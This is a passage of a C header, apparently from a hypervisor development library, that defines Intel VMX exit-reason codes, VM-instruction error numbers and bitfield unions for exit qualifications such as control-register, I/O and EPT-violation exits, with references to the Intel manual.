#define VMX_EXIT_REASON_EPT_MISCONFIGURATION 0x00000031

/**
 * @brief INVEPT
 *
 * Guest software attempted to execute INVEPT.
 */
#define VMX_EXIT_REASON_EXECUTE_INVEPT 0x00000032

/**
 * @brief RDTSCP
 *
 * Guest software attempted to execute RDTSCP and the "enable RDTSCP" and "RDTSC exiting"
 * VM-execution controls were both 1.
 */
#define VMX_EXIT_REASON_EXECUTE_RDTSCP 0x00000033

/**
 * @brief VMX-preemption timer expired
 *
 * The preemption timer counted down to zero.
 */
#define VMX_EXIT_REASON_VMX_PREEMPTION_TIMER_EXPIRED 0x00000034

/**
 * @brief INVVPID
 *
 * Guest software attempted to execute INVVPID.
 */
#define VMX_EXIT_REASON_EXECUTE_INVVPID 0x00000035

/**
 * @brief WBINVD
 *
 * Guest software attempted to execute WBINVD and the "WBINVD exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_WBINVD 0x00000036

/**
 * @brief XSETBV - Guest software attempted to execute XSETBV
 *
 * Guest software attempted to execute XSETBV.
 */
#define VMX_EXIT_REASON_EXECUTE_XSETBV 0x00000037

/**
 * @brief APIC write
 *
 * Guest software completed a write to the virtual-APIC page that must be virtualized by VMM
 * software.
 *
 * @see Vol3C[29.4.3.3(APIC-Write VM Exits)]
 */
#define VMX_EXIT_REASON_APIC_WRITE 0x00000038

/**
 * @brief RDRAND
 *
 * Guest software attempted to execute RDRAND and the "RDRAND exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_RDRAND 0x00000039

/**
 * @brief INVPCID
 *
 * Guest software attempted to execute INVPCID and the "enable INVPCID" and "INVLPG exiting"
 * VM-execution controls were both 1.
 */
#define VMX_EXIT_REASON_EXECUTE_INVPCID 0x0000003A

/**
 * @brief VMFUNC
 *
 * Guest software invoked a VM function with the VMFUNC instruction and the VM function either was
 * not enabled or generated a function-specific condition causing a VM exit.
 */
#define VMX_EXIT_REASON_EXECUTE_VMFUNC 0x0000003B

/**
 * @brief ENCLS
 *
 * Guest software attempted to execute ENCLS and "enable ENCLS exiting" VM-execution control was 1
 * and either:
 * -# EAX < 63 and the corresponding bit in the ENCLS-exiting bitmap is 1; or
 * -# EAX >= 63 and bit 63 in the ENCLS-exiting bitmap is 1.
 */
#define VMX_EXIT_REASON_EXECUTE_ENCLS 0x0000003C

/**
 * @brief RDSEED
 *
 * Guest software attempted to execute RDSEED and the "RDSEED exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_RDSEED 0x0000003D

/**
 * @brief Page-modification log full
 *
 * The processor attempted to create a page-modification log entry and the value of the PML index
 * was not in the range 0-511.
 */
#define VMX_EXIT_REASON_PAGE_MODIFICATION_LOG_FULL 0x0000003E

/**
 * @brief XSAVES
 *
 * Guest software attempted to execute XSAVES, the "enable XSAVES/XRSTORS" was 1, and a bit was set
 * in the logical-AND of the following three values: EDX:EAX, the IA32_XSS MSR, and the XSS-exiting
 * bitmap.
 */
#define VMX_EXIT_REASON_EXECUTE_XSAVES 0x0000003F

/**
 * @brief XRSTORS
 *
 * Guest software attempted to execute XRSTORS, the "enable XSAVES/XRSTORS" was 1, and a bit was set
 * in the logical-AND of the following three values: EDX:EAX, the IA32_XSS MSR, and the XSS-exiting
 * bitmap.
 */
#define VMX_EXIT_REASON_EXECUTE_XRSTORS 0x00000040
/**
 * @}
 */

/**
 * @defgroup VMX_INSTRUCTION_ERROR_NUMBERS \
 *           VM-Instruction Error Numbers
 *
 * VM-Instruction Error Numbers.
 *
 * @see Vol3C[30.4(VM INSTRUCTION ERROR NUMBERS)] (reference)
 * @{
 */
/**
 * VMCALL executed in VMX root operation.
 */
#define VMX_ERROR_VMCALL_IN_VMX_ROOT_OPERATION 0x00000001

/**
 * VMCLEAR with invalid physical address.
 */
#define VMX_ERROR_VMCLEAR_INVALID_PHYSICAL_ADDRESS 0x00000002

/**
 * VMCLEAR with VMXON pointer.
 */
#define VMX_ERROR_VMCLEAR_INVALID_VMXON_POINTER 0x00000003

/**
 * VMLAUNCH with non-clear VMCS.
 */
#define VMX_ERROR_VMLAUCH_NON_CLEAR_VMCS 0x00000004

/**
 * VMRESUME with non-launched VMCS.
 */
#define VMX_ERROR_VMRESUME_NON_LAUNCHED_VMCS 0x00000005

/**
 * VMRESUME after VMXOFF (VMXOFF and VMXON between VMLAUNCH and VMRESUME).
 */
#define VMX_ERROR_VMRESUME_AFTER_VMXOFF 0x00000006

/**
 * VM entry with invalid control field(s).
 */
#define VMX_ERROR_VMENTRY_INVALID_CONTROL_FIELDS 0x00000007

/**
 * VM entry with invalid host-state field(s).
 */
#define VMX_ERROR_VMENTRY_INVALID_HOST_STATE 0x00000008

/**
 * VMPTRLD with invalid physical address.
 */
#define VMX_ERROR_VMPTRLD_INVALID_PHYSICAL_ADDRESS 0x00000009

/**
 * VMPTRLD with VMXON pointer.
 */
#define VMX_ERROR_VMPTRLD_VMXON_POINTER 0x0000000A

/**
 * VMPTRLD with incorrect VMCS revision identifier.
 */
#define VMX_ERROR_VMPTRLD_INCORRECT_VMCS_REVISION_ID 0x0000000B

/**
 * VMREAD/VMWRITE from/to unsupported VMCS component.
 */
#define VMX_ERROR_VMREAD_VMWRITE_INVALID_COMPONENT 0x0000000C

/**
 * VMWRITE to read-only VMCS component.
 */
#define VMX_ERROR_VMWRITE_READONLY_COMPONENT 0x0000000D

/**
 * VMXON executed in VMX root operation.
 */
#define VMX_ERROR_VMXON_IN_VMX_ROOT_OP 0x0000000F

/**
 * VM entry with invalid executive-VMCS pointer.
 */
#define VMX_ERROR_VMENTRY_INVALID_VMCS_EXECUTIVE_POINTER 0x00000010

/**
 * VM entry with non-launched executive VMCS.
 */
#define VMX_ERROR_VMENTRY_NON_LAUNCHED_EXECUTIVE_VMCS 0x00000011

/**
 * VM entry with executive-VMCS pointer not VMXON pointer (when attempting to deactivate the
 * dual-monitor treatment of SMIs and SMM).
 */
#define VMX_ERROR_VMENTRY_EXECUTIVE_VMCS_PTR 0x00000012

/**
 * VMCALL with non-clear VMCS (when attempting to activate the dual-monitor treatment of SMIs and
 * SMM).
 */
#define VMX_ERROR_VMCALL_NON_CLEAR_VMCS 0x00000013

/**
 * VMCALL with invalid VM-exit control fields.
 */
#define VMX_ERROR_VMCALL_INVALID_VMEXIT_FIELDS 0x00000014

/**
 * VMCALL with incorrect MSEG revision identifier (when attempting to activate the dual-monitor
 * treatment of SMIs and SMM).
 */
#define VMX_ERROR_VMCALL_INVALID_MSEG_REVISION_ID 0x00000016

/**
 * VMXOFF under dual-monitor treatment of SMIs and SMM.
 */
#define VMX_ERROR_VMXOFF_DUAL_MONITOR 0x00000017

/**
 * VMCALL with invalid SMM-monitor features (when attempting to activate the dual-monitor treatment
 * of SMIs and SMM).
 */
#define VMX_ERROR_VMCALL_INVALID_SMM_MONITOR 0x00000018

/**
 * VM entry with invalid VM-execution control fields in executive VMCS (when attempting to return
 * from SMM).
 */
#define VMX_ERROR_VMENTRY_INVALID_VM_EXECUTION_CONTROL 0x00000019

/**
 * VM entry with events blocked by MOV SS.
 */
#define VMX_ERROR_VMENTRY_MOV_SS 0x0000001A

/**
 * Invalid operand to INVEPT/INVVPID.
 */
#define VMX_ERROR_INVEPT_INVVPID_INVALID_OPERAND 0x0000001C
/**
 * @}
 */

/**
 * @defgroup VMX_EXCEPTIONS \
 *           Virtualization Exceptions
 *
 * Virtualization Exceptions.
 *
 * @see Vol3C[25.5.6(Virtualization Exceptions)] (reference)
 * @{
 */
typedef struct {
  /**
   * The 32-bit value that would have been saved into the VMCS as an exit reason had a VM exit
   * occurred instead of the virtualization exception. For EPT violations, this value is 48
   * (00000030H).
   */
  UINT32 Reason;

  /**
   * FFFFFFFFH
   */
  UINT32 ExceptionMask;

  /**
   * The 64-bit value that would have been saved into the VMCS as an exit qualification had a VM
   * exit occurred instead of the virtualization exception.
   */
  UINT64 Exit;

  /**
   * The 64-bit value that would have been saved into the VMCS as a guest-linear address had a VM
   * exit occurred instead of the virtualization exception.
   */
  UINT64 GuestLinearAddress;

  /**
   * The 64-bit value that would have been saved into the VMCS as a guest-physical address had a VM
   * exit occurred instead of the virtualization exception.
   */
  UINT64 GuestPhysicalAddress;

  /**
   * The current 16-bit value of the EPTP index VM-execution control.
   *
   * @see Vol3C[24.6.18(Controls for Virtualization Exceptions)]
   * @see Vol3C[25.5.5.3(EPTP Switching)]
   */
  UINT16 CurrentEptpIndex;
} VMX_VIRTUALIZATION_EXCEPTION_INFORMATION;

/**
 * @}
 */

/**
 * @defgroup VMX_BASIC_EXIT_INFORMATION \
 *           Basic VM-Exit Information
 *
 * Basic VM-Exit Information.
 *
 * @see Vol3C[27.2.1(Basic VM-Exit Information)] (reference)
 * @{
 */
/**
 * @brief Exit Qualification for Debug Exceptions
 */
typedef union {
  struct {
    /**
     * @brief B0 - B3
     *
     * [Bits 3:0] When set, each of these bits indicates that the corresponding breakpoint condition
     * was met. Any of these bits may be set even if its corresponding enabling bit in DR7 is not
     * set.
     */
    UINT64 BreakpointCondition : 4;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_BIT 0
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_FLAG 0x0F
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION(_) (((_) >> 0) & 0x0F)
    UINT64 Reserved1 : 9;

    /**
     * @brief BD
     *
     * [Bit 13] When set, this bit indicates that the cause of the debug exception is "debug
     * register access detected."
     */
    UINT64 DebugRegisterAccessDetected : 1;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_BIT 13
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_FLAG 0x2000
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_MASK 0x01
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED(_) \
  (((_) >> 13) & 0x01)

    /**
     * @brief BS
     *
     * [Bit 14] When set, this bit indicates that the cause of the debug exception is either the
     * execution of a single instruction (if RFLAGS.TF = 1 and IA32_DEBUGCTL.BTF = 0) or a taken
     * branch (if RFLAGS.TF = DEBUGCTL.BTF = 1).
     */
    UINT64 SingleInstruction : 1;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_BIT 14
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_FLAG 0x4000
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION(_) (((_) >> 14) & 0x01)
    UINT64 Reserved2 : 49;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION;

/**
 * @brief Exit Qualification for Task Switch
 */
typedef union {
  struct {
    /**
     * [Bits 15:0] Selector of task-state segment (TSS) to which the guest attempted to switch.
     */
    UINT64 Selector : 16;
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_BIT 0
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_FLAG 0xFFFF
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_MASK 0xFFFF
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR(_) (((_) >> 0) & 0xFFFF)
    UINT64 Reserved1 : 14;

    /**
     * [Bits 31:30] Source of task switch initiation.
     */
    UINT64 Source : 2;
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_BIT 30
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_FLAG 0xC0000000
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_MASK 0x03
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE(_) (((_) >> 30) & 0x03)
#define VMX_EXIT_QUALIFICATION_TYPE_CALL_INSTRUCTION 0x00000000
#define VMX_EXIT_QUALIFICATION_TYPE_IRET_INSTRUCTION 0x00000001
#define VMX_EXIT_QUALIFICATION_TYPE_JMP_INSTRUCTION 0x00000002
#define VMX_EXIT_QUALIFICATION_TYPE_TASK_GATE_IN_IDT 0x00000003
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_TASK_SWITCH;

/**
 * @brief Exit Qualification for Control-Register Accesses
 */
typedef union {
  struct {
    /**
     * [Bits 3:0] Number of control register (0 for CLTS and LMSW). Bit 3 is always 0 on processors
     * that do not support Intel 64 architecture as they do not support CR8.
     */
    UINT64 ControlRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_BIT 0
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_FLAG 0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER(_) (((_) >> 0) & 0x0F)
#define VMX_EXIT_QUALIFICATION_REGISTER_CR0 0x00000000
#define VMX_EXIT_QUALIFICATION_REGISTER_CR2 0x00000002
#define VMX_EXIT_QUALIFICATION_REGISTER_CR3 0x00000003
#define VMX_EXIT_QUALIFICATION_REGISTER_CR4 0x00000004
#define VMX_EXIT_QUALIFICATION_REGISTER_CR8 0x00000008

    /**
     * [Bits 5:4] Access type.
     */
    UINT64 AccessType : 2;
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_BIT 4
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_FLAG 0x30
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_MASK 0x03
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE(_) (((_) >> 4) & 0x03)
#define VMX_EXIT_QUALIFICATION_ACCESS_MOV_TO_CR 0x00000000
#define VMX_EXIT_QUALIFICATION_ACCESS_MOV_FROM_CR 0x00000001
#define VMX_EXIT_QUALIFICATION_ACCESS_CLTS 0x00000002
#define VMX_EXIT_QUALIFICATION_ACCESS_LMSW 0x00000003

    /**
     * [Bit 6] LMSW operand type. For CLTS and MOV CR, cleared to 0.
     */
    UINT64 LmswOperandType : 1;
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_BIT 6
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_FLAG 0x40
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE(_) (((_) >> 6) & 0x01)
#define VMX_EXIT_QUALIFICATION_LMSW_OP_REGISTER 0x00000000
#define VMX_EXIT_QUALIFICATION_LMSW_OP_MEMORY 0x00000001
    UINT64 Reserved1 : 1;

    /**
     * [Bits 11:8] For MOV CR, the general-purpose register.
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_BIT 8
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_FLAG 0xF00
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER(_) (((_) >> 8) & 0x0F)
#define VMX_EXIT_QUALIFICATION_GENREG_RAX 0x00000000
#define VMX_EXIT_QUALIFICATION_GENREG_RCX 0x00000001
#define VMX_EXIT_QUALIFICATION_GENREG_RDX 0x00000002
#define VMX_EXIT_QUALIFICATION_GENREG_RBX 0x00000003
#define VMX_EXIT_QUALIFICATION_GENREG_RSP 0x00000004
#define VMX_EXIT_QUALIFICATION_GENREG_RBP 0x00000005
#define VMX_EXIT_QUALIFICATION_GENREG_RSI 0x00000006
#define VMX_EXIT_QUALIFICATION_GENREG_RDI 0x00000007
#define VMX_EXIT_QUALIFICATION_GENREG_R8 0x00000008
#define VMX_EXIT_QUALIFICATION_GENREG_R9 0x00000009
#define VMX_EXIT_QUALIFICATION_GENREG_R10 0x0000000A
#define VMX_EXIT_QUALIFICATION_GENREG_R11 0x0000000B
#define VMX_EXIT_QUALIFICATION_GENREG_R12 0x0000000C
#define VMX_EXIT_QUALIFICATION_GENREG_R13 0x0000000D
#define VMX_EXIT_QUALIFICATION_GENREG_R14 0x0000000E
#define VMX_EXIT_QUALIFICATION_GENREG_R15 0x0000000F
    UINT64 Reserved2 : 4;

    /**
     * [Bits 31:16] For LMSW, the LMSW source data. For CLTS and MOV CR, cleared to 0.
     */
    UINT64 LmswSourceData : 16;
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_BIT 16
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_FLAG 0xFFFF0000
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_MASK 0xFFFF
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA(_) (((_) >> 16) & 0xFFFF)
    UINT64 Reserved3 : 32;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_MOV_CR;

/**
 * @brief Exit Qualification for MOV DR
 */
typedef union {
  struct {
    /**
     * [Bits 2:0] Number of debug register.
     */
    UINT64 DebugRegister : 3;
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_BIT 0
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_FLAG 0x07
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_MASK 0x07
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER(_) (((_) >> 0) & 0x07)
#define VMX_EXIT_QUALIFICATION_REGISTER_DR0 0x00000000
#define VMX_EXIT_QUALIFICATION_REGISTER_DR1 0x00000001
#define VMX_EXIT_QUALIFICATION_REGISTER_DR2 0x00000002
#define VMX_EXIT_QUALIFICATION_REGISTER_DR3 0x00000003
#define VMX_EXIT_QUALIFICATION_REGISTER_DR6 0x00000006
#define VMX_EXIT_QUALIFICATION_REGISTER_DR7 0x00000007
    UINT64 Reserved1 : 1;

    /**
     * [Bit 4] Direction of access (0 = MOV to DR; 1 = MOV from DR).
     */
    UINT64 DirectionOfAccess : 1;
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_BIT 4
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_FLAG 0x10
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS(_) (((_) >> 4) & 0x01)
#define VMX_EXIT_QUALIFICATION_DIRECTION_MOV_TO_DR 0x00000000
#define VMX_EXIT_QUALIFICATION_DIRECTION_MOV_FROM_DR 0x00000001
    UINT64 Reserved2 : 3;

    /**
     * [Bits 11:8] General-purpose register.
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_BIT 8
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_FLAG 0xF00
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER(_) (((_) >> 8) & 0x0F)
    UINT64 Reserved3 : 52;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_MOV_DR;

/**
 * @brief Exit Qualification for I/O Instructions
 */
typedef union {
  struct {
    /**
     * [Bits 2:0] Size of access.
     */
    UINT64 SizeOfAccess : 3;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_BIT 0
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_FLAG 0x07
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_MASK 0x07
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS(_) (((_) >> 0) & 0x07)
#define VMX_EXIT_QUALIFICATION_WIDTH_1_BYTE 0x00000000
#define VMX_EXIT_QUALIFICATION_WIDTH_2_BYTE 0x00000001
#define VMX_EXIT_QUALIFICATION_WIDTH_4_BYTE 0x00000003

    /**
     * [Bit 3] Direction of the attempted access (0 = OUT, 1 = IN).
     */
    UINT64 DirectionOfAccess : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_BIT 3
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_FLAG 0x08
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS(_) (((_) >> 3) & 0x01)
#define VMX_EXIT_QUALIFICATION_DIRECTION_OUT 0x00000000
#define VMX_EXIT_QUALIFICATION_DIRECTION_IN 0x00000001

    /**
     * [Bit 4] String instruction (0 = not string; 1 = string).
     */
    UINT64 StringInstruction : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_BIT 4
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_FLAG 0x10
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION(_) (((_) >> 4) & 0x01)
#define VMX_EXIT_QUALIFICATION_IS_STRING_NOT_STRING 0x00000000
#define VMX_EXIT_QUALIFICATION_IS_STRING_STRING 0x00000001

    /**
     * [Bit 5] REP prefixed (0 = not REP; 1 = REP).
     */
    UINT64 RepPrefixed : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_BIT 5
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_FLAG 0x20
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED(_) (((_) >> 5) & 0x01)
#define VMX_EXIT_QUALIFICATION_IS_REP_NOT_REP 0x00000000
#define VMX_EXIT_QUALIFICATION_IS_REP_REP 0x00000001

    /**
     * [Bit 6] Operand encoding (0 = DX, 1 = immediate).
     */
    UINT64 OperandEncoding : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_BIT 6
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_FLAG 0x40
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING(_) (((_) >> 6) & 0x01)
#define VMX_EXIT_QUALIFICATION_ENCODING_DX 0x00000000
#define VMX_EXIT_QUALIFICATION_ENCODING_IMMEDIATE 0x00000001
    UINT64 Reserved1 : 9;

    /**
     * [Bits 31:16] Port number (as specified in DX or in an immediate operand).
     */
    UINT64 PortNumber : 16;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_BIT 16
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_FLAG 0xFFFF0000
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_MASK 0xFFFF
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER(_) (((_) >> 16) & 0xFFFF)
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_IO_INSTRUCTION;

/**
 * @brief Exit Qualification for APIC-Access VM Exits from Linear Accesses and Guest-Physical
 * Accesses
 */
typedef union {
  struct {
    /**
     * [Bits 11:0] - If the APIC-access VM exit is due to a linear access, the offset of access
     * within the APIC page.
     * - Undefined if the APIC-access VM exit is due a guest-physical access.
     */
    UINT64 PageOffset : 12;
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_BIT 0
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_FLAG 0xFFF
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_MASK 0xFFF
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET(_) (((_) >> 0) & 0xFFF)

    /**
     * [Bits 15:12] Access type.
     */
    UINT64 AccessType : 4;
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_BIT 12
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_FLAG 0xF000
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE(_) (((_) >> 12) & 0x0F)
    /**
     * Linear access for a data read during instruction execution.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_READ 0x00000000

    /**
     * Linear access for a data write during instruction execution.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_WRITE 0x00000001

    /**
     * Linear access for an instruction fetch.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_INSTRUCTION_FETCH 0x00000002

    /**
     * Linear access (read or write) during event delivery.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_EVENT_DELIVERY 0x00000003

    /**
     * Guest-physical access during event delivery.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_PHYSICAL_EVENT_DELIVERY 0x0000000A

    /**
     * Guest-physical access for an instruction fetch or during instruction execution.
     */
#define VMX_EXIT_QUALIFICATION_TYPE_PHYSICAL_INSTRUCTION_FETCH 0x0000000F
    UINT64 Reserved1 : 48;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_APIC_ACCESS;

/**
 * @brief Exit Qualification for EPT Violations
 */
typedef union {
  struct {
    /**
     * [Bit 0] Set if the access causing the EPT violation was a data read.
     */
    UINT64 ReadAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_BIT 0
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_FLAG 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Set if the access causing the EPT violation was a data write.
     */
    UINT64 WriteAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_BIT 1
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_FLAG 0x02
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Set if the access causing the EPT violation was an instruction fetch.
     */
    UINT64 ExecuteAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_BIT 2
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_FLAG 0x04
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] The logical-AND of bit 0 in the EPT paging-structure entries used to translate the
     * guest-physical address of the access causing the EPT violation (indicates whether the
     * guest-physical address was readable).
     */
    UINT64 EptReadable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_BIT 3
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_FLAG 0x08
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] The logical-AND of bit 1 in the EPT paging-structure entries used to translate the
     * guest-physical address of the access causing the EPT violation (indicates whether the
     * guest-physical address was writeable).
     */
    UINT64 EptWriteable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_BIT 4
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_FLAG 0x10
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] The logical-AND of bit 2 in the EPT paging-structure entries used to translate the
     * guest-physical address of the access causing the EPT violation. If the "mode-based execute
     * control for EPT" VM-execution control is 0, this indicates whether the guest-physical address
